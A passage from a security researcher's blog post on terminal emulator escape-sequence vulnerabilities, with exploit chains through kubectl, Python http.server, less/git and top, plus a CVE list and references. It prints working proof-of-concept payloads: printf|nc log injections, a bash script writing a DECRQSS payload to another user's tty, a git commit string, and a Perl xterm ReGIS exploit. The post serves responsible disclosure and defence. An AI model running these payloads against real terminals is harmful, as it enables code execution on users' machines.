``` Downside: Alt+P conflicts with DCS. [Exploitability](#exploitability) Often these terminal issues, while they are clearly serious, are not treated with the severity a web browser bug or other issue that clearly is immediately exposed to untrusted data. It should be remembered that a terminal does still deal with untrusted data, even if there is another layer of defence that programs outputting to them should escape data. These are some examples of potential exploit chains, using a tool that did not correctly escape data. [Kubernetes](#kubernetes) kubectl did not filter escape characters ([CVE-2021-25743](https://nvd.nist.gov/vuln/detail/CVE-2021-25743)). This was discovered by [Evitar Gerzi](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters). I discovered it's possible to abuse without API access, i.e. write to `/dev/termination-log`. Interestingly Kubernetes did not consider this a serious issue and the CVE sat unfixed for a while, so I fixed it after finding several terminal vulnerabilities. There is a full PoC demo at <https://github.com/dgl/houdini-kubectl-poc> ![](yt-lpmn1yUeQbE.jpg) Windows Terminal CVE-2022-44702 and kubectl Ō¢Č’ĖÅ [[YouTube]](https://www.youtube.com/watch?v=lpmn1yUeQbE) [Local HTTP server](#local-http-server) Again to call back to 2003, the scenario in HD Moore's paper is an administrator running tail on their web logs. These days a more likely scenario is a user running a command like `python3 -m http.server`. It turns out Python [did not escape](https://github.com/python/cpython/issues/100001) control characters that it outputted in its http.server module. This allows several attacks, even if the terminal itself does not have a vulnerability. The first one is hiding things in logs. ``` printf "GET /?\e]0; HTTP/1.0\r\n\r\n" | nc localhost 8000 ``` Using the DECRQSS bug leads to something like: ``` printf "GET /?\ePqm\x3\e\\ \ePqm;ls;\e\\ \ePqm\r\e\\ HTTP/1.0\r\n\r\n" | nc localhost 8000 ``` ![](yt-_j8m7VMpjTY.jpg) iTerm2 CVE-2022-45872 and Python 3 http.server Ō¢Č’ĖÅ [[YouTube]](https://www.youtube.com/watch?v=_j8m7VMpjTY) Other command line web server tooling may be vulnerable to similar, some I've reported it to don't even seem to consider it a security issue, but note request spoofing or hiding is usually possible to some extent. [Reverse SSH shell](#reverse-ssh-shell) This exploit has the property that it does not need another vulnerable program to get the escape characters to the user, it just uses Unix permissions. For this to work the attacker needs the ability to either run code as the user, or root on the host they are SSHed to. It can then escape back to the host the user SSHed from if there's a suitable terminal vulnerability (and the user connected from a local shell, i.e. they typed `ssh host`, rather than invoking SSH from a menu or similar). Clearly this needs a vulnerable terminal, rather than being an expected possibility as SSH agent hijacking can be, if SSH jump boxes are used. ``` #!/bin/bash # Disconnect a user and attempt a terminal exploit on them # David Leadbeater, 2023 <https://dgl.cx/0bsd> pid=${1:?$'\e'"[GUsage: $0 pid-of-shell"} tty="/dev/$(ps -otty -p$pid | tail -1)" kill -STOP $pid printf '\eP$q;xxx;open -a Calculator\r\e\\ \eP$qm\e\\' > $tty kill -9 $pid ``` [less](#less) I found an issue in less where OSC 8 (hyperlink) was not terminated by anything but a ^G (BEL) or ESC \ (ST), whereas most terminals take ESC and any character as a terminating sequence (and should, per the VT100 state machine mentioned elsewhere in this paper). The less author unfortunately patched this without a security release, so I posted to [oss-security about it](https://www.openwall.com/lists/oss-security/2023/02/07/7), when it was only available as a patch. This can be combined with "git" to achieve RCE in a git repo. e.g. with mintty which is default terminal on git for windows and had the DECRQSS bug. The exploit for less, git bash and mintty is to simply get a string like this into a git commit message, then `git log` will open Calculator: ``` ^[]8;;http://^[c^[P$qm q :;calc.exe;^M^[\ ``` ![](yt-l5LgxJionXc.jpg) git for Windows and mintty CVE-2022-47583 and less CVE-2022-46663 Ō¢Č’ĖÅ [[YouTube]](https://www.youtube.com/watch?v=l5LgxJionXc) [top](#top) It turns out some versions of Linux's top (procps) don't escape output. The top authors have fixed in 4.x, but procps on many Linux distros is still 3.x. ![](/2023/09/top-color.png) Top authors aren't hugely concerned because there's other ways to hide from process tools on Linux (e.g. [CVE-2018-1121](https://www.exploit-db.com/exploits/44806)). I demonstrated how to use a bug in xterm's ReGIS support to own someone running `top` in [my DEF CON talk](https://youtu.be/Y4A7KMQEmfo?t=2435). ReGIS is a vector graphics mode that happens to have a report command, it could be asked to set a particular name, then report that name. The xterm bug is CVE-2023-40359 and was fixed in [xterm 380](https://invisible-island.net/xterm/xterm.log.html#xterm_380) "pointer/overflow fixes". To exploit this requires running several processes, as a single line in top cannot contain much data. It was easiest to arrange for the processes to consume different amounts of memory, rather than carefully controlling CPU usage. xterm CVE-2023-40359 exploit ``` #!/usr/bin/perl # xterm CVE-2023-40359 exploit # Run this, then run "top -o RES" in an xterm with ReGIS support (compiled with # ReGIS and: xterm -ti 340). sub mem_use { my $x = "x" x ($_[0] * 10*1024*1024); sleep 3600; } if (fork) { $0 = "\ePpL(F'x')\e\\"; mem_use(120); } elsif(fork) { $0 = "\ePpL(A'\x03')\e\\"; mem_use(110); } elsif(fork) { $0 = "\ePpR(l)\e\\"; mem_use(100); } elsif(fork) { $0 = "\ePpL(A'\x7F=\"/')\e\\"; mem_use(90); } elsif(fork) { $0 = "\ePpR(l)\e\\"; mem_use(80); } elsif(fork) { $0 = "\ePpL(A'\x10\x7Ftm')\e\\"; mem_use(70); } elsif (fork) { $0 = "\ePpR(l)\e\\"; mem_use(60); } elsif(fork) { $0 = "\ePpL(A'\x10\x7Fp/')\e\\"; mem_use(50); } elsif(fork) { $0 = "\ePpR(l)\e\\"; mem_use(40); } elsif(fork) { $0 = "\ePpL(A'\x10\x7F/x')\e\\"; mem_use(30); } elsif(fork) { $0 = "\ePpR(l)\e\\"; mem_use(20); } elsif(fork) { $0 = "\ePpL(A'\x01\$\x05')\e\\"; mem_use(10); } else { $0 = "\ePpR(l)\e\\"; mem_use(5); } ``` Aside: busybox ps and top are also vulnerable to similar, I reported this but they haven't been fixed yet. [Testing](#testing) One surprising outcome from this research was how variants of previous CVEs existed in other terminals. To that end, I would like to make it easy for anyone to test terminals against known terminal CVEs. I've written a tool which runs as an SSH server and runs some tests against terminals. I plan to collect many more CVEs into this, so the code will serve as a collection of terminal vulnerabilities. The tool is available at <https://github.com/dgl/vt-houdini> or can be accessed [via SSH](ssh://termtest.dgl.cx): `ssh termtest.dgl.cx` ![A vulnerable version of iTerm2, being tested by vt-houdini](/2023/09/termtest.png) This is an example of a vulnerable version of iTerm2 being tested by the terminal tester. [Other protections](#other-protections) Tools like screen and tmux work by essentially emulating a terminal within your terminal. You may think this provides a layer of isolation from your actual terminal, however this is a false sense of security, screen has an escape sequence to pass straight through to the actual terminal. Tmux also has an escape sequence, but version 3.3 turns off allow-passthrough by default, so tmux with allow-passthrough turned off does provide some protection. (There are reasons to use passthrough, for example hterm provides a [script](https://chromium.googlesource.com/apps/libapps/%2B/refs/heads/main/hterm/etc/osc52.sh) which can set the system clipboard from even within a screen session, as usual security is a trade-off.) One interesting tool is mosh, which primarily exists to reduce latency of SSH sessions, it does this by emulating a terminal on the server side and sending diffs (and other tricks), rather than simply sending escape sequences over the wire. As a result of this, its terminal implementation is fully isolated from the terminal the user uses. Some terminals have options to disable potentially insecure escape sequences. Often this is on by default and changing it will bring back some of the known insecure sequences discussed here, so that is not recommended, but is potentially useful for testing. (For example rxvt-unicode has an `-insecure` option and if enabled `"\e[7n"` will reply with a response including a newline.) iTerm2 has sensible defaults (it disables title reporting), but it also has an advanced option to disable "Potentially Insecure" escape sequences. A paranoid user may turn that on (for example that setting mitigated some of [solid-snail's findings](https://blog.solidsnail.com/posts/2023-08-28-iterm2-rce)). [Terminals to avoid](#terminals-to-avoid) Sometimes software is beyond help. I do not recommend anyone uses [Terminology](https://www.enlightenment.org/about-terminology.md). It is vulnerable by default, but the author doesn't consider it a security issue, based on someone else's report from 2015. See [this commit](https://git.enlightenment.org/enlightenment/terminology/commit/144e0b5068aa25b7fce822a94101586f374aa236) Additionally some terminals support C1 controls in UTF-8 encoded text, which per [this 2015 posting to oss-security](https://www.openwall.com/lists/oss-security/2015/09/20/1) is problematic. Some terminals have the ability to turn this off, if they do not such as Kitty I cannot recommend their use. [Summary](#summary) This research found quite simple variants of vulnerabilities from 2003 and 2008, as well as some novel new vulnerabilities and ways to exploit them. These vulnerabilities have the potential to be used in various kind of attacks, but in particular given they can be used to attack developers and administrators they are of particular relevance in securing the software supply chain. I believe by addressing and understanding these issues we can help to make the software supply chain more secure. While this paper does include some unfixed issues I believe the most serious bugs which could have been used for supply chain attacks are addressed and disclosing all this can help make the open source world a safer place. [CVEs found](#cves-found) * [CVE-2022-45872](https://nvd.nist.gov/vuln/detail/CVE-2022-45872) - iTerm2 DECRQSS * [CVE-2022-44702](https://github.com/microsoft/terminal/releases/tag/v1.15.2874.0) - Windows Terminal + WSL working directory * [CVE-2022-47583](https://nvd.nist.gov/vuln/detail/CVE-2022-47583) - mintty DECRQSS * [CVE-2022-45063](https://www.openwall.com/lists/oss-security/2022/11/10/1) - xterm OSC 50 * [CVE-2022-46387](https://nvd.nist.gov/vuln/detail/CVE-2022-46387) - ConEmu Title * [CVE-2023-39150](https://nvd.nist.gov/vuln/detail/CVE-2023-39150) - ConEmu Title Take 2 * [CVE-2022-4170](https://www.openwall.com/lists/oss-security/2022/12/05/1) - rxvt-unicode background * [CVE-2022-23465](https://nvd.nist.gov/vuln/detail/CVE-2022-23465) - SwiftTerm DECRQSS * [CVE-2022-46663](https://nvd.nist.gov/vuln/detail/CVE-2022-46663) - less OSC 8 * [CVE-2023-39726](https://nvd.nist.gov/vuln/detail/CVE-2023-39726) - mintty OSC 50 * [CVE-2023-40359](https://nvd.nist.gov/vuln/detail/CVE-2023-40359) - xterm ReGIS * [CVE-2023-40216](https://nvd.nist.gov/vuln/detail/CVE-2023-40216) - OpenBSD wscons parameter overflow [Talks](#talks) * [BlueHat 2023](https://www.youtube.com/watch?v=iIHw0KWgzAs): "Houdini of the Terminal: From Kubernetes to RCE" * [Everything Open 2023](https://www.youtube.com/watch?v=4kfDBNzStbs): "Houdini of the Terminal: The need for escaping" * [DEF CON 31](https://www.youtube.com/watch?v=Y4A7KMQEmfo): "Terminally Owned - 60 years of escaping" ([slides](terminally-owned-slides.pdf)) [Credits and thanks](#credits-and-thanks) Thanks to everyone who has previously researched these issues, especially [HD Moore](https://hdm.io) for the 2003 research, [Evitar Gerzi](https://twitter.com/g3rzi) for finding the kubectl issue originally and [ST├¢K](https://www.stokfredrik.com/) for [presenting this in an engaging way](https://www.youtube.com/watch?v=3T2Al3jdY38) and finding yet more attack vectors. Thank you to all the terminal authors for fixing the bugs I found and in some cases adding extra hardening. Thanks to [G-Research Open Source](https://opensource.gresearch.com) for letting me research this all. [References](#references) Key citations: * HD Moore, 2003, ["Terminal Emulator Security Issues"](https://marc.info/?l=bugtraq&m=104612710031920&w=2) * Eviatar Gerzi, 2022; ["Don't Trust This Title: Abusing Terminal Emulators with ANSI Escape Characters"](https://www.cyberark.com/resources/threat-research-blog/dont-trust-this-title-abusing-terminal-emulators-with-ansi-escape-characters) * Phrack, 1994, [#46 file 4](http://phrack.org/issues/46/4.html) "Line Noise" - flash.c * Mitre; CWE-150; <https://cwe.mitre.org/data/definitions/150.html> * Paul Szabo, 2008, [CVE-2008-2383](http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=510030) Other interesting sources: * Nicholas Boucher and Ross Anderson, 2021, "Trojan Source: Invisible Vulnerabilities"; <https://trojansource.codes/> * Thomas Dickey, 2023, "XTerm Control Sequences"; <https://invisible-island.net/xterm/ctlseqs/ctlseqs.html> * Bob Bemer, "That Powerful ESCAPE Character", [https://web.archive.org/web/20010411103243/http://www.bobbemer.com/ESCAPE.HTM](https://web.archive.org/web/20010411103243/http%3A//www.bobbemer.com/ESCAPE.HTM) * Lear Siegler, 1979, "ADM-3A Operator's Manual"; <https://vt100.net/lsi/adm3a-om.pdf> * Digital Equipment Corporation, 1994, "VT520/VT525 Video Terminal Programmer Information"; <http://web.mit.edu/dosathena/doc/www/ek-vt520-rm.pdf> * Paul Flo Williams, "A parser for DEC's ANSI-compatible video terminals." VT100.net; <https://vt100.net/emu/dec_ansi_parser> * Konstantinos Foutzopoulos, 2021, "Sixel for terminal graphics"; <https://konfou.xyz/posts/sixel-for-terminal-graphics/> * Unicode Consortium, Mark Davis et al., 2014; Unicode Technical Report #36; <https://unicode.org/reports/tr36/> * Unicode Consortium, Robin Leroy, et al., 2023; Unicode Technical Standard #55; <https://www.unicode.org/reports/tr55/>

5th October 2023
in [code](/tag/code), [talk](/tag/talk)

┬®
[David Leadbeater](/about)

[![GitHub](/static/github.png)](https://github.com/dgl)
[![Mastodon](/static/mastodon.png)](https://infosec.exchange/%40dgl)
[![Feed](/static/feed.png)](https://dgl.cx/feed "Feed")

![](/hit?url=https%3a%2f%2fdgl.cx%2f2023%2f09%2fansi-terminal-security)
